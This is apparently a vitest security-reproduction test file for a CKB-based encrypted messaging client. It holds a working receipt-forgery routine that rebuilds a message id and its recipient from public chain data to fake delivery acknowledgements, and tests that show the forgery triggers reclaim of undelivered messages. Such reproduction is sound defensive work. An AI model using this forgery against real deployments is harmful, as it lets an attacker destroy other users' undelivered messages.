import { Cell, CellOutput, fixedPointFrom, hexFrom } from "@ckb-ccc/core";
import { CKB_TESTNET, codec, deriveConversationId } from "@cemp/core";
import {
  deriveIdentityKeys,
  encryptEnvelope,
  mldsaV2KeygenFromSeed,
  mnemonicToSeed,
  wipeIdentityKeyBundle,
} from "@cemp/crypto";
import { afterAll, describe, expect, it } from "vitest";
import vectors from "../../cemp-test-vectors/vectors/mldsa-v2.json";
import { assembleTextMessage } from "./assemble.js";
import { buildMessageTypeArgs, type CempMessageTypeRef } from "./builders.js";
import { CempClient, type JsonRpcTransport } from "./client.js";
import { processIncomingText, type IncomingTextMessage } from "./incoming.js";
import {
  ResponseLifecycle,
  type LifecycleMessage,
  type LifecycleStore,
  type LifecycleWatch,
} from "./lifecycle.js";
import { MlDsaV2TxSigner } from "./signing.js";
import { MockCkbClient, fillHex, toOutputLike } from "./testing/mock-ccc-client.js";
import { hashFromRpcBody } from "./testing/rpc-body.js";

/**
 * SECURITY PHASE A — VULNERABILITY REPRODUCTION (pre-fix).
 *
 * Handoff matrix rows RCPT-01..RCPT-04 against `ResponseLifecycle`. These
 * tests PASS today by asserting the VULNERABLE behaviour: a receipt advances
 * (or releases the attachment of) an outgoing message knowing only its
 * 16-byte envelope message id, which is CLEARTEXT in the published cell. The
 * receipt's sender is never compared with the message's intended recipient.
 * Phase E is expected to flip these deliberately.
 *
 * Chain is fully mocked; nothing is broadcast. The fake store below is a
 * recording in-memory `LifecycleStore` (cemp-ckb cannot depend on
 * cemp-database; the DB-backed variant is exercised in
 * packages/cemp-sync/src/authentication.test.ts).
 *
 * See docs/review/PHASE-A-REPRODUCTION.md.
 */

function hexToBytes(hex: string): Uint8Array {
  const bare = hex.startsWith("0x") ? hex.slice(2) : hex;
  const out = new Uint8Array(bare.length / 2);
  for (let i = 0; i < out.length; i++) {
    out[i] = Number.parseInt(bare.slice(2 * i, 2 * i + 2), 16);
  }
  return out;
}

function bytesToHex(bytes: Uint8Array): string {
  return Array.from(bytes, (b) => b.toString(16).padStart(2, "0")).join("");
}

// Deterministic TEST-ONLY identities (BIP39 reference vectors).
const ALICE = deriveIdentityKeys(
  mnemonicToSeed("legal winner thank year wave sausage worth useful legal winner thank yellow"),
);
const BOB = deriveIdentityKeys(
  mnemonicToSeed("letter advice cage absurd amount doctor acoustic avoid letter advice cage above"),
);
const CAROL = deriveIdentityKeys(
  mnemonicToSeed(
    "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about",
  ),
);
const ALICE_PROFILE_ID = hexToBytes("aa".repeat(32));
const BOB_PROFILE_ID = hexToBytes("bb".repeat(32));
const CAROL_PROFILE_ID = hexToBytes("cc".repeat(32));
const MALLORY_PROFILE_ID = hexToBytes("4d".repeat(32));
const ALICE_DEVICE = hexToBytes("01".repeat(16));
const MALLORY_DEVICE = hexToBytes("66".repeat(16));

/**
 * A public profile directory: the profile ids any chain reader can enumerate
 * from on-chain profile cells. Mallory uses it ONLY to work out which public
 * profile Alice was writing to (by matching the cleartext conversation id).
 */
const PUBLIC_PROFILE_DIRECTORY = [CAROL_PROFILE_ID, MALLORY_PROFILE_ID, BOB_PROFILE_ID];

const MESSAGE_TYPE_REF: CempMessageTypeRef = {
  codeHash: CKB_TESTNET.deployments.cempMessageType!.codeHash,
  hashType: CKB_TESTNET.deployments.cempMessageType!.hashType,
  cellDep: {
    txHash: CKB_TESTNET.deployments.cempMessageType!.txHash,
    index: "0x0",
    depType: "code",
  },
};

/** Alice's wallet signer (her app spends/reclaims her own cells). */
const aliceTxKeyPair = mldsaV2KeygenFromSeed(hexToBytes(vectors.keygen[0]!.seed));

const ROW_ID = 7;
const CELL_CAPACITY_CKB = 500;

/* ── recording in-memory LifecycleStore ─────────────────────────────────── */

interface FakeRow {
  rowId: number;
  state: string;
  envelopeMessageIdHex: string;
  logicalMessageId: string;
  chainRef: { txHash: string; outpointIndex: number } | null;
  /** Profile id of the contact the message was sent to (the only valid acker). */
  recipientProfileIdHex: string | null;
}

class RecordingLifecycleStore implements LifecycleStore {
  readonly rows = new Map<number, FakeRow>();
  readonly transitions: { rowId: number; to: string }[] = [];
  readonly reclaimable: string[] = [];
  readonly released: string[] = [];
  readonly feeBurns: string[] = [];
  readonly attachmentRemoteDownloaded: number[] = [];
  readonly txs = new Map<
    string,
    {
      txHash: string;
      purpose: string;
      state: string;
      capacityShannon: string | null;
      feeShannon: string | null;
      txHex: string | null;
    }
  >();
  /** `message:<logical id>` journal capacity (what publication recorded). */
  readonly messageJournalCapacity = new Map<string, string>();
  readonly watches: (LifecycleWatch & { spent: boolean })[] = [];

  transitionMessage(rowId: number, to: string): Promise<void> {
    const row = this.rows.get(rowId);
    if (row === undefined) {
      return Promise.reject(new Error(`no row ${String(rowId)}`));
    }
    row.state = to;
    this.transitions.push({ rowId, to });
    return Promise.resolve();
  }
  setMessageChainRef(rowId: number, ref: { txHash: string; outpointIndex: number }): Promise<void> {
    this.rows.get(rowId)!.chainRef = ref;
    return Promise.resolve();
  }
  findOutgoingByEnvelopeMessageId(hex: string) {
    const row = [...this.rows.values()].find((r) => r.envelopeMessageIdHex === hex);
    return Promise.resolve(
      row === undefined
        ? undefined
        : { rowId: row.rowId, state: row.state, recipientProfileIdHex: row.recipientProfileIdHex },
    );
  }
  listOutgoingByState(state: string): Promise<LifecycleMessage[]> {
    return Promise.resolve(
      [...this.rows.values()]
        .filter((r) => r.state === state)
        .map((r) => ({ rowId: r.rowId, state: r.state, chainRef: r.chainRef })),
    );
  }
  recordOutgoingTx(input: {
    txHash: string;
    purpose: string;
    state: string;
    feeShannon?: string | undefined;
    capacityShannon?: string | undefined;
    txHex?: string | undefined;
  }): Promise<void> {
    this.txs.set(input.txHash, {
      txHash: input.txHash,
      purpose: input.purpose,
      state: input.state,
      capacityShannon: input.capacityShannon ?? null,
      feeShannon: input.feeShannon ?? null,
      txHex: input.txHex ?? null,
    });
    return Promise.resolve();
  }
  markOutgoingTxState(txHash: string, state: string): Promise<void> {
    this.txs.get(txHash)!.state = state;
    return Promise.resolve();
  }
  markOutgoingTxStateIf(txHash: string, expectedFromState: string, state: string): Promise<number> {
    const tx = this.txs.get(txHash);
    if (tx === undefined || tx.state !== expectedFromState) {
      return Promise.resolve(0);
    }
    tx.state = state;
    return Promise.resolve(1);
  }
  findLatestOutgoingTxByPurposePrefix(prefix: string) {
    return Promise.resolve(
      [...this.txs.values()].filter((t) => t.purpose.startsWith(prefix)).at(-1),
    );
  }
  reserveCapacity(): Promise<void> {
    return Promise.resolve();
  }
  markCapacityReclaimable(amountShannon: string): Promise<void> {
    this.reclaimable.push(amountShannon);
    return Promise.resolve();
  }
  getMessageJournalInfo(rowId: number) {
    const row = this.rows.get(rowId);
    if (row === undefined) {
      return Promise.resolve(undefined);
    }
    return Promise.resolve({
      logicalMessageId: row.logicalMessageId,
      capacityShannon: this.messageJournalCapacity.get(row.logicalMessageId) ?? null,
    });
  }
  registerWatch(input: { txHash: string; outpointIndex: number; purpose: string }): Promise<void> {
    this.watches.push({ ...input, spent: false });
    return Promise.resolve();
  }
  listActiveWatches(): Promise<LifecycleWatch[]> {
    return Promise.resolve(this.watches.filter((w) => !w.spent));
  }
  markWatchSpent(txHash: string, outpointIndex: number): Promise<void> {
    for (const w of this.watches) {
      if (w.txHash === txHash && w.outpointIndex === outpointIndex) {
        w.spent = true;
      }
    }
    return Promise.resolve();
  }
  pruneSpentWatches(): Promise<number> {
    return Promise.resolve(0);
  }
  markAttachmentRemoteDownloaded(rowId: number): Promise<void> {
    this.attachmentRemoteDownloaded.push(rowId);
    return Promise.resolve();
  }
  releaseReclaimedCapacity(amountShannon: string): Promise<void> {
    this.released.push(amountShannon);
    return Promise.resolve();
  }
  recordFeeBurn(amountShannon: string): Promise<void> {
    this.feeBurns.push(amountShannon);
    return Promise.resolve();
  }
}

/* ── chain fixture (mock; nothing leaves the process) ───────────────────── */

function makeChain(liveCells: Map<string, Cell>): {
  client: CempClient;
  sent: Record<string, unknown>[];
} {
  const sent: Record<string, unknown>[] = [];
  const transport: JsonRpcTransport = {
    call(_url, method, params) {
      switch (method) {
        case "get_live_cell": {
          const req = params[0] as { tx_hash: string; index: string };
          const cell = liveCells.get(`${req.tx_hash}:${BigInt(req.index).toString()}`);
          if (cell === undefined) {
            return Promise.resolve({ cell: null, status: "dead" });
          }
          const type = cell.cellOutput.type;
          return Promise.resolve({
            cell: {
              output: {
                capacity: `0x${cell.cellOutput.capacity.toString(16)}`,
                lock: {
                  code_hash: cell.cellOutput.lock.codeHash,
                  hash_type: cell.cellOutput.lock.hashType,
                  args: cell.cellOutput.lock.args,
                },
                type:
                  type === undefined
                    ? null
                    : { code_hash: type.codeHash, hash_type: type.hashType, args: type.args },
              },
              data: { content: cell.outputData, hash: fillHex(0x00, 32) },
            },
            status: "live",
          });
        }
        case "send_transaction": {
          const body = params[0] as Record<string, unknown>;
          sent.push(body);
          return Promise.resolve(hashFromRpcBody(body));
        }
        case "get_transaction":
          return Promise.resolve({
            tx_status: { status: "committed", block_hash: fillHex(0x99, 32) },
          });
        case "get_header":
          return Promise.resolve({
            number: "0x100",
            epoch: "0x0",
            timestamp: "0x0",
            hash: fillHex(0x99, 32),
          });
        default:
          return Promise.reject(new Error(`fake chain: unexpected method ${method}`));
      }
    },
  };
  return { client: new CempClient({ transport }), sent };
}

/**
 * Alice's legitimate pending outbound message to Bob, published as a message
 * cell locked by Alice's wallet (she retains reclaim authority, rule 9).
 */
function aliceSendsToBob(signer: MlDsaV2TxSigner) {
  const assembled = assembleTextMessage({
    text: "hi bob (genuine, from alice)",
    senderProfileId: ALICE_PROFILE_ID,
    recipientProfileId: BOB_PROFILE_ID,
    recipientKemPublicKey: BOB.mlKem.publicKey,
    senderDeviceId: ALICE_DEVICE,
    receiptRequest: 1,
  });
  const cell = Cell.from({
    outPoint: { txHash: fillHex(0xa1, 32), index: 0 },
    cellOutput: toOutputLike(
      CellOutput.from({
        capacity: fixedPointFrom(CELL_CAPACITY_CKB),
        lock: signer.lockScript(),
        type: {
          codeHash: MESSAGE_TYPE_REF.codeHash,
          hashType: MESSAGE_TYPE_REF.hashType,
          args: hexFrom(
            buildMessageTypeArgs(
              assembled.routeTag,
              assembled.conversationTag,
              assembled.messageNonce,
            ),
          ),
        },
      }),
    ),
    outputData: hexFrom(assembled.envelopeBytes),
  });
  return { assembled, cell };
}

function seedAliceOutgoingRow(
  store: RecordingLifecycleStore,
  envelopeMessageId: Uint8Array,
  cell: Cell,
) {
  store.rows.set(ROW_ID, {
    rowId: ROW_ID,
    state: "available_on_chain",
    envelopeMessageIdHex: bytesToHex(envelopeMessageId),
    logicalMessageId: "lm-alice-to-bob",
    chainRef: { txHash: cell.outPoint.txHash, outpointIndex: Number(cell.outPoint.index) },
    recipientProfileIdHex: bytesToHex(BOB_PROFILE_ID),
  });
  store.messageJournalCapacity.set("lm-alice-to-bob", fixedPointFrom(CELL_CAPACITY_CKB).toString());
}

/**
 * MALLORY'S FORGERY — inputs are ONLY public data:
 *  - `publishedCellData`: Alice's message-cell output data, readable by any
 *    chain observer (get_cells / get_transaction);
 *  - `aliceKemPublicKey`: from Alice's public on-chain profile cell;
 *  - `directory`: public profile ids.
 * No secret key of Alice, Bob, or anyone else is touched.
 */
function malloryForgesReceipt(input: {
  publishedCellData: Uint8Array;
  aliceKemPublicKey: Uint8Array;
  directory: readonly Uint8Array[];
  status: number;
}): { forgedEnvelope: Uint8Array; claimedSender: Uint8Array; stolenMessageId: Uint8Array } {
  // 1. The header is the AEAD AAD — cleartext. message_id is the receipt key.
  const { header } = codec.decodeCempEnvelopeV1(input.publishedCellData);
  const stolenMessageId = header.message_id;
  const aliceId = header.sender_profile_id;
  // 2. Identify the intended recipient: conversation_id = H(sorted(alice, bob)).
  const claimedSender = input.directory.find((candidate) =>
    codec.bytesEqual(deriveConversationId(aliceId, candidate), header.conversation_id),
  );
  if (claimedSender === undefined) {
    throw new Error("recipient not in directory");
  }
  // 3. Encrypt a receipt-only message TO Alice, CLAIMING to be Bob.
  const forged = assembleTextMessage({
    text: "",
    senderProfileId: claimedSender,
    recipientProfileId: aliceId,
    recipientKemPublicKey: input.aliceKemPublicKey,
    senderDeviceId: MALLORY_DEVICE,
    receipts: [{ messageId: stolenMessageId, status: input.status }],
  });
  return { forgedEnvelope: forged.envelopeBytes, claimedSender, stolenMessageId };
}

/** Alice's device runs the normal incoming pipeline on whatever arrives. */
function aliceProcesses(cellData: Uint8Array): IncomingTextMessage {
  return processIncomingText({
    cellData,
    ownKemSecretKey: ALICE.mlKem.secretKey,
    ownProfileId: ALICE_PROFILE_ID,
  });
}

function makeLifecycle(liveCells: Map<string, Cell> = new Map()) {
  const mockChain = new MockCkbClient();
  const signer = new MlDsaV2TxSigner({ keyPair: aliceTxKeyPair, client: mockChain });
  const store = new RecordingLifecycleStore();
  const chain = makeChain(liveCells);
  const lifecycle = new ResponseLifecycle({
    client: chain.client,
    signer,
    messageType: MESSAGE_TYPE_REF,
    store,
  });
  return { lifecycle, store, signer, mockChain, chain };
}

/* ── tests ──────────────────────────────────────────────────────────────── */

// STILL OPEN after the receipt→recipient binding: Mallory claims to BE Bob
// (found via the cleartext conversation_id), and v1 cannot tell her apart.
// Closing these needs an authenticated receipt (signature or proof of
// decryption) — a wire change.
describe("VULN reproduction (still open): RCPT-01 forged 0x01 receipt from public chain data", () => {
  it("Mallory's receipt (built from Alice's published cell + Alice's public KEM key) walks Alice's message to reclaim_queued and funds reclaimable", async () => {
    const { lifecycle, store, signer } = makeLifecycle();
    const { assembled, cell } = aliceSendsToBob(signer);
    seedAliceOutgoingRow(store, assembled.messageId, cell);

    const forgery = malloryForgesReceipt({
      publishedCellData: hexToBytes(cell.outputData),
      aliceKemPublicKey: ALICE.mlKem.publicKey,
      directory: PUBLIC_PROFILE_DIRECTORY,
      status: 0x01,
    });
    // Mallory recovered the exact id and the intended recipient from public data.
    expect(forgery.stolenMessageId).toEqual(assembled.messageId);
    expect(forgery.claimedSender).toEqual(BOB_PROFILE_ID);

    const incoming = aliceProcesses(forgery.forgedEnvelope);
    expect(incoming.senderProfileId).toEqual(BOB_PROFILE_ID); // claimed, unverified

    const acked = await lifecycle.processAcknowledgements(incoming);

    // PRE-FIX: full delivery state walk + capacity moved reserved → reclaimable,
    // although Bob never received anything. Post-fix: [] and no side effects.
    expect(acked).toEqual([ROW_ID]);
    expect(store.transitions).toEqual([
      { rowId: ROW_ID, to: "downloaded_by_recipient" },
      { rowId: ROW_ID, to: "acknowledged" },
      { rowId: ROW_ID, to: "reclaim_queued" },
    ]);
    expect(store.reclaimable).toEqual([fixedPointFrom(CELL_CAPACITY_CKB).toString()]);
  });

  it("the next reclaim batch then SPENDS Alice's message cell before Bob ever read it (mocked broadcast)", async () => {
    const mockChain = new MockCkbClient();
    const signer = new MlDsaV2TxSigner({ keyPair: aliceTxKeyPair, client: mockChain });
    const { assembled, cell } = aliceSendsToBob(signer);
    const funds = Cell.from({
      outPoint: { txHash: fillHex(0xf1, 32), index: 1 },
      cellOutput: toOutputLike(
        CellOutput.from({ capacity: fixedPointFrom(10_000), lock: signer.lockScript() }),
      ),
      outputData: "0x",
    });
    mockChain.addCells(cell, funds);
    const live = new Map([[`${cell.outPoint.txHash}:0`, cell]]);
    const chain = makeChain(live);
    const store = new RecordingLifecycleStore();
    const lifecycle = new ResponseLifecycle({
      client: chain.client,
      signer,
      messageType: MESSAGE_TYPE_REF,
      store,
    });
    seedAliceOutgoingRow(store, assembled.messageId, cell);

    const forgery = malloryForgesReceipt({
      publishedCellData: hexToBytes(cell.outputData),
      aliceKemPublicKey: ALICE.mlKem.publicKey,
      directory: PUBLIC_PROFILE_DIRECTORY,
      status: 0x01,
    });
    await lifecycle.processAcknowledgements(aliceProcesses(forgery.forgedEnvelope));
    const result = await lifecycle.executeReclaimBatch();

    // PRE-FIX: a reclaim tx consuming the undelivered message cell is signed
    // and handed to the (mock) node; the message is marked reclaimed and its
    // capacity released. Bob can no longer fetch the message from chain.
    expect(result?.reclaimedRowIds).toEqual([ROW_ID]);
    expect(store.rows.get(ROW_ID)?.state).toBe("reclaimed");
    expect(chain.sent).toHaveLength(1);
    const inputs = (chain.sent[0] as { inputs: { previous_output: { tx_hash: string } }[] }).inputs;
    expect(inputs.map((i) => i.previous_output.tx_hash)).toContain(cell.outPoint.txHash);
    expect(store.released).toHaveLength(1);
    expect(BigInt(store.released[0]!)).toBeGreaterThan(0n);
  });
});

describe("VULN reproduction (still open): RCPT-02 forged 0x05 attachment receipt", () => {
  it("marks Alice's attachment as remotely downloaded (permits chunk reclaim) without any real download", async () => {
    const { lifecycle, store, signer } = makeLifecycle();
    const { assembled, cell } = aliceSendsToBob(signer);
    seedAliceOutgoingRow(store, assembled.messageId, cell);

    const forgery = malloryForgesReceipt({
      publishedCellData: hexToBytes(cell.outputData),
      aliceKemPublicKey: ALICE.mlKem.publicKey,
      directory: PUBLIC_PROFILE_DIRECTORY,
      status: 0x05,
    });
    const acked = await lifecycle.processAcknowledgements(aliceProcesses(forgery.forgedEnvelope));

    // PRE-FIX: the chunk-release gate (attachments.remote_downloaded) is set.
    // The message state itself is untouched by 0x05 (existing design).
    expect(acked).toEqual([]);
    expect(store.attachmentRemoteDownloaded).toEqual([ROW_ID]);
    expect(store.transitions).toEqual([]);
  });

  it("0x05 is applied even when the message row is in a non-ackable state (no state guard at all)", async () => {
    const { lifecycle, store, signer } = makeLifecycle();
    const { assembled, cell } = aliceSendsToBob(signer);
    seedAliceOutgoingRow(store, assembled.messageId, cell);
    store.rows.get(ROW_ID)!.state = "pending"; // not yet even committed
    const forgery = malloryForgesReceipt({
      publishedCellData: hexToBytes(cell.outputData),
      aliceKemPublicKey: ALICE.mlKem.publicKey,
      directory: PUBLIC_PROFILE_DIRECTORY,
      status: 0x05,
    });
    await lifecycle.processAcknowledgements(aliceProcesses(forgery.forgedEnvelope));
    expect(store.attachmentRemoteDownloaded).toEqual([ROW_ID]);
  });
});

describe("FIXED (receipt→recipient binding): RCPT-03 a real third party (Carol) acks a message meant for Bob", () => {
  it("Carol, honestly identifying as Carol, acknowledging Alice→Bob is ignored", async () => {
    const { lifecycle, store, signer } = makeLifecycle();
    const { assembled, cell } = aliceSendsToBob(signer);
    seedAliceOutgoingRow(store, assembled.messageId, cell);

    // v1 has no envelope signature, so "valid signer Carol" can only mean
    // Carol truthfully naming herself (and funding/signing her own CKB tx).
    // The lifecycle never compares the receipt sender with Bob.
    const { header } = codec.decodeCempEnvelopeV1(hexToBytes(cell.outputData));
    const carolsReceipt = assembleTextMessage({
      text: "",
      senderProfileId: CAROL_PROFILE_ID,
      recipientProfileId: ALICE_PROFILE_ID,
      recipientKemPublicKey: ALICE.mlKem.publicKey,
      senderDeviceId: hexToBytes("cc".repeat(16)),
      receipts: [{ messageId: header.message_id, status: 0x01 }],
    });
    const incoming = aliceProcesses(carolsReceipt.envelopeBytes);
    expect(incoming.senderProfileId).toEqual(CAROL_PROFILE_ID);
    expect(incoming.conversationId).toEqual(
      deriveConversationId(ALICE_PROFILE_ID, CAROL_PROFILE_ID),
    );

    const acked = await lifecycle.processAcknowledgements(incoming);
    // Was accepted pre-fix (Carol ≠ Bob). Now: no ack, no state, no capacity.
    expect(acked).toEqual([]);
    expect(store.rows.get(ROW_ID)?.state).toBe("available_on_chain");
    expect(store.transitions).toEqual([]);
    expect(store.reclaimable).toEqual([]);
  });
});

describe("VULN reproduction (still open for impersonation): RCPT-04 wrong conversation / network / message id", () => {
  /** Build a receipt-only envelope to Alice with full control over the header. */
  function receiptWithHeader(over: {
    conversationId: Uint8Array;
    network: number;
    messageId: Uint8Array;
  }): Uint8Array {
    const receiptEnvelopeId = hexToBytes("ab".repeat(16));
    const payload = codec.encodeCempPayloadV1({
      message_id: receiptEnvelopeId,
      body_type: 0x01,
      recipient_profile_id: ALICE_PROFILE_ID,
      text: new Uint8Array(0),
      attachment_manifests: [],
      reply_to_message_id: undefined,
      reply_to_outpoint: undefined,
      receipts: [{ message_id: over.messageId, status: 0x01 }],
      receipt_request: 0,
      client_timestamp: 1n,
      sender_device_id: MALLORY_DEVICE,
      padding: new Uint8Array(0),
    });
    return encryptEnvelope({
      payload,
      recipientKemPublicKey: ALICE.mlKem.publicKey,
      header: {
        protocol_version: 1,
        network: over.network,
        content_type: 0x01,
        message_id: receiptEnvelopeId,
        conversation_id: over.conversationId,
        sender_profile_id: BOB_PROFILE_ID,
        created_at_client: 1n,
        reply_to_message_id: undefined,
        expiry_hint: 0n,
      },
    }).envelopeBytes;
  }

  it("REPRODUCED — wrong conversation: an arbitrary (all-zero) conversation_id is accepted and still acks", async () => {
    const { lifecycle, store, signer } = makeLifecycle();
    const { assembled, cell } = aliceSendsToBob(signer);
    seedAliceOutgoingRow(store, assembled.messageId, cell);
    const incoming = aliceProcesses(
      receiptWithHeader({
        conversationId: new Uint8Array(32),
        network: 0x01,
        messageId: assembled.messageId,
      }),
    );
    // conversation_id is never checked against H(sender, recipient)…
    expect(incoming.conversationId).toEqual(new Uint8Array(32));
    // …nor against the target message's conversation.
    expect(await lifecycle.processAcknowledgements(incoming)).toEqual([ROW_ID]);
    expect(store.rows.get(ROW_ID)?.state).toBe("reclaim_queued");
  });

  it("NOT reproduced — wrong network: non-testnet network bytes fail envelope validation before decryption", () => {
    const { assembled } = aliceSendsToBob(
      new MlDsaV2TxSigner({ keyPair: aliceTxKeyPair, client: new MockCkbClient() }),
    );
    const conversationId = deriveConversationId(ALICE_PROFILE_ID, BOB_PROFILE_ID);
    for (const network of [0x00, 0x02]) {
      expect(() =>
        aliceProcesses(
          receiptWithHeader({ conversationId, network, messageId: assembled.messageId }),
        ),
      ).toThrow(/network/);
    }
  });

  it("NOT reproduced — wrong message id: an id matching no outgoing row has no state or capacity effect", async () => {
    const { lifecycle, store, signer } = makeLifecycle();
    const { assembled, cell } = aliceSendsToBob(signer);
    seedAliceOutgoingRow(store, assembled.messageId, cell);
    const incoming = aliceProcesses(
      receiptWithHeader({
        conversationId: deriveConversationId(ALICE_PROFILE_ID, BOB_PROFILE_ID),
        network: 0x01,
        messageId: hexToBytes("00".repeat(16)),
      }),
    );
    expect(await lifecycle.processAcknowledgements(incoming)).toEqual([]);
    expect(store.transitions).toEqual([]);
    expect(store.reclaimable).toEqual([]);
    expect(store.attachmentRemoteDownloaded).toEqual([]);
  });
});

afterAll(() => {
  wipeIdentityKeyBundle(ALICE);
  wipeIdentityKeyBundle(BOB);
  wipeIdentityKeyBundle(CAROL);
});
